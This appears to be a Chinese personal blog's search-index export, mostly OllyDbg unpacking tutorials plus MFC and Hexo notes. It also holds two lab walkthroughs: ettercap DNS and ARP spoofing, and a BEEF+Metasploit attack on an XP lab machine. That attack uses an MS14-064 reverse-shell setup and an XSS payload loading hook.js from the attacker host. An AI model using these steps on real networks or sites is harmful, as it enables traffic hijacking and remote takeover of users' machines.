<h2 id="VirtualFree法1"><a href="#VirtualFree法1" class="headerlink" title="VirtualFree法1"></a>VirtualFree法1</h2><p>这种方法首先是下VirtualFree的断点，执行到我们的用户组代码，然后搜索push 8000，之后我们就往下跟踪，然后大跳转跟过去，一般就到了我们的OEP，具体操作看截图：<br>首先下端之后运行，然后回到我们的程序领空。<br><img src="img1.jpg" alt="从VirtualFree回到程序"><br>然后接下来我们搜索push 8000，进行下断。<br><img src="img2.jpg" alt="在push 8000下断"><br>最后就来到了我们的OEP</p>
<h2 id="VirtualFree法2"><a href="#VirtualFree法2" class="headerlink" title="VirtualFree法2"></a>VirtualFree法2</h2><p>这个更加简单，我们下VirtualFree的断点，然后执行两次，意思就是在第二次断在VirtualFree的时候我们返回到程序领空，继续单步就好了。</p>
<h2 id="mov转移法"><a href="#mov转移法" class="headerlink" title="mov转移法"></a>mov转移法</h2><p>就是说当我们刚进入程序的时候，如果首句出现mov指令的时候，我们给他后面的地址下断点，例如：<br><img src="img3.jpg" alt="查看数据"><br>然后运行，跟下去就好了<br>但在这里我们看到一个函数片段，也就是有一个retn，我们在片段下方进行下断：<br><img src="img4.jpg" alt="下断"><br>然后运行，继续往下跟踪，就到了OEP。</p>
<h2 id="VirtualAlloc法"><a href="#VirtualAlloc法" class="headerlink" title="VirtualAlloc法"></a>VirtualAlloc法</h2><p>这个法子和VirtualFree法2基本没差别，一个操作方法，无非下的函数变了，但是后面跟踪的会有点长。</p>
<h2 id="最后一次异常法"><a href="#最后一次异常法" class="headerlink" title="最后一次异常法"></a>最后一次异常法</h2><p>首先我们先将OD中的所有异常全取消掉，然后重新载入程序，操作如下：<br><img src="img5.jpg" alt="设置OD"><br>然后我们运行程序，程序会中断，直到我们运行N次之后，程序顺利跑起来了，那我们再次重新运行，然后运行N-1次，查看SE（异常）处理器在堆栈中记录的地址：<br><img src="img6.jpg" alt="SE处理器地址"><br>然后转到这个地址，接下来的操作和我们的mov转移法相同了。（不要忘记调节回去哦！）</p>
<h2 id="at-GetVersion"><a href="#at-GetVersion" class="headerlink" title="at GetVersion"></a>at GetVersion</h2><p>程序就会运行到GetVersion，然后我们在段尾下端，然后返回去，发现你发现你现在就在OEP下方，嘻嘻。<br><img src="img7.jpg" alt="OEP附近"></p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>Rebuilt input list</title>
    <url>/2020/01/14/Rebuilt-input-list/</url>
    <content><![CDATA[<h1 id="找OEP的一个小技巧"><a href="#找OEP的一个小技巧" class="headerlink" title="找OEP的一个小技巧"></a>找OEP的一个小技巧</h1><p>我们载入程序，但在这里我发现了一个小问题，我用之前的一个OD载入之后我进入的却是系统的领空，而且一直进入不了用户组的代码，如下图所示：<br><img src="img1.jpg" alt="未进入程序领空"><br>但是我重换了一个比较基础的OD却发现是停留在程序的领空，如下图所示：<br><img src="img2.jpg" alt="程序领空"><br>这个时候我们先暂且不去深究这个的原因，之后再去研究具体的错误设置。<br>这个程序我们使用单步跟踪法来进行脱壳。<br>一步一步的往下跟踪，直到这个地方：<br><img src="img3.jpg" alt="程序OEP关键跳转"><br>我们可以看到这个时候的jnz是准备跳过去，但是我们发现塔下一个CALL却是call了一个[EBX+C]，这个地方就是比较关键的地方，因为一般壳为了保护自身，都会喜欢将地址转换到一些寄存在加偏移的一个相对基址寻址的地方，我们修改我们标志寄存器的值，让他不进行跳转，然后步入，我们会进入这个地方：<br><img src="img4.jpg" alt="程序OEP"><br>这里我们比较要注意的地方是，OD在这个地方我们一般要进行分析代码，也就是Ctrl+A，有的时候壳非常喜欢这个寄存器间接跳转，我们可以用回车键，或者Ctrl+G跳转到那个位置，看看像不像，然后选择步入。</p>
<h1 id="重建输入表"><a href="#重建输入表" class="headerlink" title="重建输入表"></a>重建输入表</h1><p>接着上面的，我们用我们常用的方法，进行dump，这里不演示了，我就直接脱掉。<br>这个时候我们在使用import REC的时候我们发现，貌似所有的函数都是无效的，这个时候我们就需要进行手动修改了，这里我提供两种方法：</p>
<h2 id="第一种：快速搜索法"><a href="#第一种：快速搜索法" class="headerlink" title="第一种：快速搜索法"></a>第一种：快速搜索法</h2><p>其实虽然import REC给我们的不是很正确，但是我们DD过去看一下：<br><img src="img5.jpg" alt="输入表附近"><br>这个时候我们自己定位一下，看一下上下方否是一片0的地方，从头拉到尾。<br><img src="img6.jpg" alt="输入表头部"><br><img src="img7.jpg" alt="输入表结尾"><br>这个时候就是可以了的，我们输入起始的RVA：2500，大小0x538,这个大小如果不是太确定，我们可以使用1000，但不是太建议，特殊情况下不要了，这个时候我们常规方法进行dump。</p>
<h2 id="第二种：CALL地址搜索法"><a href="#第二种：CALL地址搜索法" class="headerlink" title="第二种：CALL地址搜索法"></a>第二种：CALL地址搜索法</h2><p>这个方法比较直接，我们可以直接看他OEP下方CALL的地址，例如：<br><img src="img8.jpg" alt="快速CALL定位输入表"><br>只要是下方的CALL地址就行，这个时候就到输入表的头部了，然后就可以了。</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>LoadPE and importREC</title>
    <url>/2020/01/13/LoadPE-and-importREC/</url>
    <content><![CDATA[<h2 id="LoadPE"><a href="#LoadPE" class="headerlink" title="LoadPE"></a>LoadPE</h2><p>这款工具还是比较有名的，在刚学PE结构之前，就对这个工具有所了解，主要是简单的介绍一下配合OD和importREC的使用，在之后深入了解。<br>首先我们先对找到OEP的工具加载。<br><img src="img1.jpg" alt="LoadPE"><br>在这个列表框中找到我们所在的进程<br><img src="img2.jpg" alt="纠正镜像大小"><br>纠正一下镜像文件的大小，然后点击完全脱壳，会生成一个dump的文件。<br><img src="img9.jpg" alt="完全脱壳"><br>这款工具比较强大的其实是他的PE编辑器，我们之后再去讨论。</p>
<h2 id="import-REC"><a href="#import-REC" class="headerlink" title="import REC"></a>import REC</h2><p>这款工具是用来修复IAT的一些信息，由于这款工具可以自动找到我们的函数入口点之类的信息，所一比较方便，测试的软件加密的比较简单，所以不需要回OD进行查找，之后有机会和LoadPE一款演示。<br>言归正传，我们选择我们的进程。<br><img src="img3.jpg" alt="选择进程"><br>需要填写我哦们OEP的一个相对RAV，然后点击自动搜索IAT，获取输入表，再点击显示无效的函数，后对无效的函数进行cut掉就好了。<br><img src="img4.jpg" alt="获取IAT"><br>如果出现这个状况，我们一般通过OD进行确认一遍。<br>我们记住他返回给我们的RVA和size<br><img src="img5.jpg" alt="检查"><br>然后在OD中查看他的内容，dd就可以了，还可以看大一些提示信息。<br>import REC只是给我们以个大体的范围。<br>我们需要自己验证一下。<br><img src="img6.jpg" alt="验证"><br>我们，拖动字节为00的地方（一大片0的地方），然后看OD给我们指示的长度大小。<br><img src="img7.jpg" alt="验证"><br>与我们的import REC的结果相同，这个就很舒服了，嘻嘻。<br>回到我们的import REC，点击获取输入表。<br><img src="img8.jpg" alt="获取输入表"><br>这个时候就可以了，由于VB的程序比较特殊，输入表之类的都是自己搞的，和我们C++写的程序是有一些不同的。<br>我们点击修复抓取文件，选择哪个程序，他会生成一些  文件名_.exe的文件。<br><img src="img10.jpg" alt="修复完毕"><br>这个样子就脱壳完毕了。</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>反汇编工具</tag>
      </tags>
  </entry>
  <entry>
    <title>Common-Unshell</title>
    <url>/2020/01/12/Common-Unshell/</url>
    <content><![CDATA[<h1 id="常见的脱壳方式"><a href="#常见的脱壳方式" class="headerlink" title="常见的脱壳方式"></a>常见的脱壳方式</h1><p>首先我们使用PEID进行查壳<br><img src="img1.jpg" alt="查壳"><br>发现是：ASPack 2.12 -&gt; Alexey Solodovnikov的壳，我们进行脱壳。</p>
<h2 id="单步跟进"><a href="#单步跟进" class="headerlink" title="单步跟进"></a>单步跟进</h2><p>其实这个方法就是最直接的，我们直接单步跟踪，向上的跳转在下一步按F4，指导跟踪到大的jmp，这样的关键性标识也有popad，但是这个一般要在一开始的程序入口点是pushad这个寄存机，例如：<br><img src="img2.jpg" alt="pushad"><br>我们一直跟踪，跟到这个地方。<br>但是下面有个call，我们单步步过的话呢，发现程序运行起来了，我们需要跟进。<br><img src="img3.jpg" alt="popad"><br>我们可以看到，我们运行到了popad，下面紧跟着跳转和retn，这个就很像了，我们继续运行。<br><img src="img4.jpg" alt="OEP"><br>可以看到这个retn就跳转到了我们的OEP，但是要记住删除代码分析，这个是一个比较明显的VB程序，而且我们的代码段回到了RAV1000的位置，这个时候我们用插件Dump出来。<br><img src="img5.jpg" alt="查壳"><br>确实是一个VB的程序。</p>
<h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>其实也就是ESP改变的时候我们下一个硬件断点，然后运行，ESP改变的时候程序暂停，我么单步跟下就可以了。<br><img src="img7.jpg" alt="HWESP"><br>然后我们运行（删除硬件断点不要忘记），会来到这个位置：<br><img src="img8.jpg" alt="OEPJmp"><br>可以看到确实快到了，我们但不跟踪几下就可以了。</p>
<h2 id="关键搜索"><a href="#关键搜索" class="headerlink" title="关键搜索"></a>关键搜索</h2><p>其实也就是搜索popad，记住不要搜索整个快，因为太大了，我们Ctrl+F进行搜索，会看到如下的结果：<br><img src="img9.jpg" alt="区段"><br>我们Ctrl+L就可以搜索下一个，记住一般来说，附近都有大的跳转和返回，一般也就是跨区段的跳转。</p>
<h2 id="二次镜像法"><a href="#二次镜像法" class="headerlink" title="二次镜像法"></a>二次镜像法</h2><p>首先我们对我们rsrc（资源）断下内存写入断点，这个就是进行解密，然后再对我们的code（代码）断进行下内存写入断点，这个样子就能到达我们的OEP了，具体操作如下：<br>点击M打开区段表。<br><img src="img10.jpg" alt="区段"><br>然后我们就会运行到这个位置：<br><img src="img11.jpg" alt="断下"><br>然后我们下我们code断点，然后运行。<br><img src="img12.jpg" alt="断下"><br>然后我们运行之后会运行到这个地方：<br><img src="img13.jpg" alt="OEPJmp"><br>然后就到我们熟悉的地方了。</p>
<h2 id="EIP跟踪法"><a href="#EIP跟踪法" class="headerlink" title="EIP跟踪法"></a>EIP跟踪法</h2><p>这个方法之前就了解了，使用OD的TC指令进行表达式计算，主要是找到我们的壳的区间，然后使用tc eip&lt;xxxxxxx，进行下端，tc这类的指令大家可以去看我的：<br><a href="https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/" target="_blank" rel="noopener" title="OD快捷代码">https://wker666.github.io/2020/01/12/OD-QuickKeyBoard/</a><br>其实也就是对制定跟踪直到eip的位置到达了：<br><img src="img14.jpg" alt="区段"><br>我们按下Enter，然后运行，他会很慢的运行。<br>（不总么会用，之后深究一下）</p>
<h2 id="SFX跟踪法"><a href="#SFX跟踪法" class="headerlink" title="SFX跟踪法"></a>SFX跟踪法</h2><p>通过OD给我们的SFX（暂时还不知道这是个什么，应该是有点异常的意思，之后会出相关的知识学习）进行跟踪<br><img src="img15.jpg" alt="选项"><br>选择SFX，选择第二个选项（有点时候需要第三个，具体看情况）：<br><img src="img16.jpg" alt="选项"><br>然后重新启动程序，就会直接到达OEP，但记住要调回来哦。<br><img src="img17.jpg" alt="OEPJmp"></p>
<p><strong><strong><em>这是比较常见的一些脱壳技巧，之后还会更新。</em></strong></strong></p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>OD-QuickKeyBoard</title>
    <url>/2020/01/12/OD-QuickKeyBoard/</url>
    <content><![CDATA[<p>CALC :         判断表达式<br>WATCH :      添加监视表达式<br>AT :             在指定地址进行反汇编<br>FOLLOW :     跟随命令<br>ORIG :         反汇编于 EIP<br>DUMP           在指定地址进行转存<br>DA :            转存为反汇编代码<br>DB :            使用十六进制字节格式转存<br>DC :            使用 ASCII 格式转存<br>DD :            转存在堆栈格式<br>DU :            转存在 UNICODE 格式<br>DW :           使用十六进制字词格式转存<br>STK :          前往堆栈中的地址<br>AS  :          （AS + 地址 + 字符串） 在指定地址进行汇编<br>BP :             进行条件中断（有条件的断点）<br>BPX :           中断在全部调用 （Call）<br>BPD :           清除全部调用中的断点<br>BC :             清除断点<br>MR :             内存断点于访问时<br>MW :            内存断点于写入时<br>MD :             清除内存断点<br>HR :             访问时进行硬件中断<br>HW :            写入时进行硬件中断<br>HE :              执行时进行硬件中断<br>HD :              清除硬件断点<br>STOP :          停止运行程序调试<br>PAUSE :        暂停执行程序调试<br>RUN :            运行程序进行调试<br>GE :              运行和通过例外<br>SI :              单步进入 Call 中<br>SO :             步过 Call<br>TI :              跟踪进入直到地址<br>TO :            跟踪步过直到地址<br>TC :            跟踪进入直到满足条件<br>TOC :          跟踪步过直到满足条件<br>TR :            运行直到返回<br>TU :            运行直到用户代码<br>LOG :          查看记录窗口<br>MOD :         查看模块窗口<br>MEM :          查看内存窗口<br>CPU :           查看 CPU 窗口<br>CS :            查看 Call 堆栈<br>BRK :           查看断点窗口<br>OPT :           打开选项设置窗口<br>EXIT :          退出 OllyDbg<br>QUIT :          退出 OllyDbg<br>OPEN :         打开一个可执行文件<br>CLOSE :       关闭可执行文件  </p>
]]></content>
      <categories>
        <category>反汇编工具</category>
      </categories>
      <tags>
        <tag>反汇编工具</tag>
      </tags>
  </entry>
  <entry>
    <title>MFC-LoadBitmap</title>
    <url>/2020/01/11/MFC-LoadBitmap/</url>
    <content><![CDATA[<h1 id="MFC学习记录"><a href="#MFC学习记录" class="headerlink" title="MFC学习记录"></a>MFC学习记录</h1><p>今天在回头用Picture control这个控件的时候，发现出现一些错误，这里记录一下，不要以后踩坑了。<br>当我们要加载一幅位图时，我们要讲这个控件的Type属性设置为Bitmap，否则你将会一直加载不出位图，默认的只是加载一个无填充的矩形框。<br>下面是一些属性：</p>
<blockquote>
<p>Type属性</p>
<blockquote>
<p>Frame：显示一个无填充的矩形框，边框颜色可以通过Color属性的下拉列表设定<br>Etched Horz：显示一条横分割线<br>Etched Vert：显示一条竖分割线<br>Rectangle：显示一个填充的矩形框，矩形颜色可通过Color属性的下拉列表设定<br>Icon：显示一个图标（Icon），图标通过Image 下拉列表来设置图标资源ID<br>Bitmap：显示一个位图（Bitmap），位图通过Image 下拉列表来设置位图资源ID<br>Enhanced Metafile：显示一个加强的元数据文件（Metafile）<br>Owner Draw：自绘</p>
</blockquote>
</blockquote>
<p>并且在这里我们设置好后，如果我们要用MFC给我们的CBitmap类的话呢，可以直接使用图片的ID号，如果用LoadBitmap(Hinstance可以通过AfxGetApp()-&gt;m_hinstance获得)，我们的第二个参数要通过MAKEINTRESOURCE转换，而不是文件路径，LoadImage也有个坑也需要记录一下，LR_LOADFROMFILE这个才是加载文件到内存。常用的方法：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CBitmap bitmap;  &#x2F;&#x2F; CBitmap对象，用于加载位图   </span><br><span class="line">HBITMAP hBmp;    &#x2F;&#x2F; 保存CBitmap加载的位图的句柄   </span><br><span class="line">bitmap.LoadBitmap(IDB_BITMAP1);  &#x2F;&#x2F; 将位图IDB_BITMAP1加载到bitmap </span><br><span class="line">hBmp &#x3D; (HBITMAP)bitmap.GetSafeHandle();  &#x2F;&#x2F; 获取bitmap加载位图的句柄   </span><br><span class="line">m_jzmPicture.SetBitmap(hBmp);    &#x2F;&#x2F; 设置图片控件m_jzmPicture的位图图片为IDB_BITMAP1</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>MFC</category>
      </categories>
      <tags>
        <tag>MFC</tag>
      </tags>
  </entry>
  <entry>
    <title>ettercap</title>
    <url>/2020/01/08/ettercap/</url>
    <content><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>劫持内网数据包，强行更改DNS</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.137)<br>靶机：32位XP(192.168.209.129)<br>我们使用ETTERCAP</p>
<p>ETTERCAP一款著名的嗅探劫持工具，比较好用的插件就要数DNS劫持和ARP欺骗了。<br>使用<strong><em>vim /etc/ettercap/etter.dns</em></strong>编辑我们的配置文件,在这之前，我们需要先规范我们的思路，在这里既然可以劫持DNS，</p>
<p>这个时候我们的ettercap就该上场了，我们首先设置我们的DNS劫持页面。<br><strong><em>vim /etc/ettercap/etter.dns</em></strong> 使用VIM进行编辑，也可以用自带的文本进行编辑。<br>将下面的这段文本找到并改为这个样子：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">microsoft.com      A   107.170.40.56</span><br><span class="line">*.microsoft.com    A   107.170.40.56</span><br><span class="line">www.microsoft.com  PTR 107.170.40.56      # Wildcards in PTR are not allowed</span><br><span class="line">*				 A	 192.168.209.137   #这两条使我们添加的</span><br><span class="line">*				 PTR  192.168.209.137  #这两条使我们添加的</span><br></pre></td></tr></table></figure>
<p>我们打开劫持工具，首先设置我们的网卡：<br><img src="img1.jpg" alt="网卡设置"></p>
<p>设置好我们的网卡之后，我们扫描内网的机子，然后设置劫持，这里点击这两项：<br><img src="img2.jpg" alt="网卡设置"><br>我们会得到如下的几个IP：<br><img src="img3.jpg" alt="网卡设置"></p>
<p>首先.1的使我Win10的机子，.2是我的网关，.129是目标的机子，这个时候我们将.2的机子Add to Target1，.129的机子Add to Target2.<br>之后我们设置我们的ARP，根据我这个样子进行设置：</p>
<p><img src="img4.jpg" alt="网卡设置"></p>
<p>设置我之后我们选择插件进行执行了，选择</p>
<p><img src="img5.jpg" alt="网卡设置"></p>
<p>我们点击Start sniffing<br>然后我们在靶机上访问百度，会看到我们的结果：<br><img src="img6.jpg" alt="网卡设置"><br>并且我们的ettercap会收到如下的信息：<br><img src="img7.jpg" alt="网卡设置"></p>
<p>到此为止，我们的劫持就成功了，这是一种比较简单的方式，下章劫持我会介绍一下如何ARP欺骗的断网攻击，这样帮助我们在渗透测试网站的时候可以拿到C段就可以C段劫持。</p>
]]></content>
      <categories>
        <category>嗅探劫持</category>
      </categories>
      <tags>
        <tag>嗅探劫持</tag>
      </tags>
  </entry>
  <entry>
    <title>BEEF+MSF</title>
    <url>/2020/01/06/BEEF-MSF/</url>
    <content><![CDATA[<h1 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h1><p>通过IE的漏洞提升我们的权限</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>攻击机：Kali(192.168.209.138)<br>靶机：32位XP(192.168.209.129)<br>我们使用BEEF+MSF</p>
<h2 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h2><p>我们就可以联想到使用MSF的ms14_064_ole_code_execution脚本，他可以利用IE浏览器的漏洞，这里我们配置一下属性，他会生成一个URL给我们，具体配置如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;browser&#x2F;ms14_064_ole_code_execution &#x2F;&#x2F;使用064的脚本</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp  &#x2F;&#x2F;使用交互的shell</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set srvhost 192.168.209.137 &#x2F;&#x2F;设置主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set uripath &#x2F;</span><br><span class="line">上面这一句是设置我们的路径，这样设置就可以了</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set lhost 192.168.209.138  &#x2F;&#x2F;设置监听主机</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; set AllowPowershellPrompt true</span><br><span class="line"></span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; exploit &#x2F;&#x2F;开始执行</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.209.138:4444 </span><br><span class="line">msf5 exploit(windows&#x2F;browser&#x2F;ms14_064_ole_code_execution) &gt; [*] Using URL: http:&#x2F;&#x2F;192.168.209.138:8080&#x2F;</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>

<p>可以看到我们的监听端口未8080，也就是我们默认的端口号。</p>
<p>既然我们的监听端开启了，我们就来利用BEEF欺骗吧，首先打开我们的BEEF，这里说一下我的Kali没有自带，大家一样的话呢需要安装的。</p>
<p>打开BEEF之后会出现下面的页面：<br><img src="img1.jpg" alt="BEEF页面"></p>
<p>我们扫描一下目标网站的端口，发现开了80，打开网站，发现这么一个网址：</p>
<p><img src="img2.jpg" alt="网站页面"></p>
<p>发现是一个小论坛，我们猜测有XSS，这个时候我们提交我们的恶意JS代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;&#x2F;tExtArEa&gt;&#39;&quot;&gt;&lt;sCRiPt sRC&#x3D;http:&#x2F;&#x2F;192.168.209.138:3000&#x2F;hook.js&gt;&lt;&#x2F;sCrIpT&gt;</span><br></pre></td></tr></table></figure>

<p>这是一个比较广泛的用法，我们提交上去，当管理员，打开这个链接的时候，管理员会看到如下的页面：<br><img src="img3.jpg" alt="管理员视野"></p>
<p>我们的BEEF上线了：<br><img src="img4.jpg" alt="BEEF上线页面"></p>
<p>忽略我之前测试的哪一个。<br>这个时候我们上线我们的MSF，<a href="http://192.168.209.138:8080" target="_blank" rel="noopener">http://192.168.209.138:8080</a><br>这个URL，使我们的MSF利用URL，我们使用BEEF的：Redirect Browser插件，将我们的页面强行重定向为我们的MSF页面，这个时候我们的Session就上线了：<br><img src="img5.jpg" alt="BEEF重定向"></p>
<p><img src="img6.jpg" alt="上线效果图"><br>这个时候我们使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sessions -i</span><br></pre></td></tr></table></figure>
<p>查看我们的session，如果和效果图一样，那说明我们拿到权限了，然后使用sessions 1来执行我们的shell，这个1是根据上线的ID号，从1开始排序的。<br>然后简单执行以下dir：<br><img src="img7.jpg" alt="MSF执行"><br><img src="img8.jpg" alt="MSF执行"><br>这个时候发现已经可以了，这个时候其实我们就已经达到了拿取Shell的目的。<br>我们还是可以配合ettercap进行劫持提权，这个留给大家自己去思考，不知道的可以参考我的关于ettercap的文章。<br>其实写这篇文章的过程有很多坎坷，中途XP无数次蓝屏，原因我的Windbg给搞的，希望大家多多关注。</p>
]]></content>
      <categories>
        <category>内网入侵</category>
      </categories>
      <tags>
        <tag>内网入侵</tag>
      </tags>
  </entry>
  <entry>
    <title>BeginToLearn-Unshell</title>
    <url>/2020/01/06/%E8%84%B1%E5%A3%B3%E5%AD%A6%E4%B9%A01/</url>
    <content><![CDATA[<h1 id="脱壳学习"><a href="#脱壳学习" class="headerlink" title="脱壳学习"></a>脱壳学习</h1><h2 id="ESP定律"><a href="#ESP定律" class="headerlink" title="ESP定律"></a>ESP定律</h2><p>初学脱壳，之前学习了反汇编的知识，开始学习脱壳</p>
<p>最初接触的脱壳比较好用的就是ESP定律脱壳，方法比较简单，在ESP的值改变的时候给ESP下硬件的一个断点，比较方便的是：<br><img src="img1.jpg" alt="ESP断点"><br>我们点击运行，之后他一一般会断下，之后就会看到一些跳转，这些跳转中比较重要的是jmp跳转，jmp跳转之后我们但不跟过去，一般就是可以跳到我们的OEP位置<br><img src="img2.jpg" alt="ESP断点"><br><strong>这个时候可能会有向上的跳转，我们不分析太细节的话呢，我们直接在jmp上下断点，运行，让他直接到jmp，之后就会跳到OEP，主要要关注的是否是跨区段的跳转，如果是跨区段的跳转，并且跳转的结束位置是我们的代码区块，那么一般就到我们真正的OEP，但是可能出现OD将这段代码误认为ASCII码，所以我们需要删除分析或者分析代码，效果图如下：</strong><br><img src="img3.jpg" alt="ESP断点"></p>
<h1 id="Dump出脱壳文件"><a href="#Dump出脱壳文件" class="headerlink" title="Dump出脱壳文件"></a>Dump出脱壳文件</h1><p>这里可以简单的使用OD带的插件，如果不行的话呢用import REC，再不行我们就手动修改IAT使用loadPE，这里这个小程序我们使用OD的插件就可以了，具体操作如下：<br><img src="TK1/img4.jpg" alt="ESP断点"><br>这里注意，如果我们插件不行的话呢，我们需要取消勾选重建输入表，目的是为了我们能够在其他工具中重新建表，这样子生成的文件我们就能够方便调试了。</p>
]]></content>
      <categories>
        <category>脱壳篇</category>
      </categories>
      <tags>
        <tag>脱壳篇</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo-Method</title>
    <url>/2020/01/05/Hexo-Method/</url>
    <content><![CDATA[<h1 id="Hexo语法"><a href="#Hexo语法" class="headerlink" title="Hexo语法"></a>Hexo语法</h1><p>文章持续更新</p>
<h2 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h2><p>新建一篇文章，先试用hexo new “title”新建一篇文章，使用hexo -g d命令部署发布。</p>
<h2 id="删除文章"><a href="#删除文章" class="headerlink" title="删除文章"></a>删除文章</h2><p>先删除你要删除的文章md文章，然后进行hexo -g d部署就可以了(别忘记删除文章的文件夹)<br>但是部署之后可能需要好几秒种之后才会在网站上刷新</p>
<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>在我们想使用#的时候要注意，#后面我们需要加上一个空格，否则不会解析</p>
<h2 id="加入图片"><a href="#加入图片" class="headerlink" title="加入图片"></a>加入图片</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![你想输入的替代文字](xxxx&#x2F;图片名.jpg)</span><br><span class="line">这个图片要放在生成的文件的文件夹中，网上好多的方法不知道是不是错误的，反正我是不行，可能是编译器的问题吧</span><br></pre></td></tr></table></figure>
<p>测试效果如下：<br><img src="test/test.jpg" alt="测试的图片"></p>
<h2 id="区块"><a href="#区块" class="headerlink" title="区块"></a>区块</h2><p>使用&gt;可以设置我们的层次，可以多个&gt;多层次</p>
]]></content>
  </entry>
</search>
